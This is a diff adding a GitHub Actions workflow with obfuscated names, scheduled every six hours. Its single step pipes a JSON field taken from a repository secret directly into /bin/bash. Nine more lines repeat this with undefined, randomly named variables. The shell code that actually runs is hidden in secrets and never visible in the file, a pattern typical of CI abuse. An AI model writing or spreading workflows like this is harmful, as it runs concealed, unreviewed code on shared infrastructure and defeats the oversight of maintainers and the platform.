@@ -1,0 +1,26 @@
+name: fenbieshisiyiduiwuyiduikeianzaide
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '24 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: fenbieshisiyiduiwuyiduikeianzaide
+        env:
+          ia1: ${{ secrets.ia1 }}
+        run: |
+          echo $ia1 | jq -r .ats5205 | /bin/bash
+          echo $ky3376 | jq -r .pr991 | /bin/bash
+          echo $xcqz5827 | jq -r .ytnq93 | /bin/bash
+          echo $eh027 | jq -r .zqp2 | /bin/bash
+          echo $qxv7 | jq -r .i7 | /bin/bash
+          echo $hgjvb7506 | jq -r .te50911 | /bin/bash
+          echo $sab5942 | jq -r .d34726 | /bin/bash
+          echo $gdhte85424 | jq -r .peyko17 | /bin/bash
+          echo $payp431 | jq -r .ykv121 | /bin/bash
+          echo $g4 | jq -r .vqiii9837 | /bin/bash
+
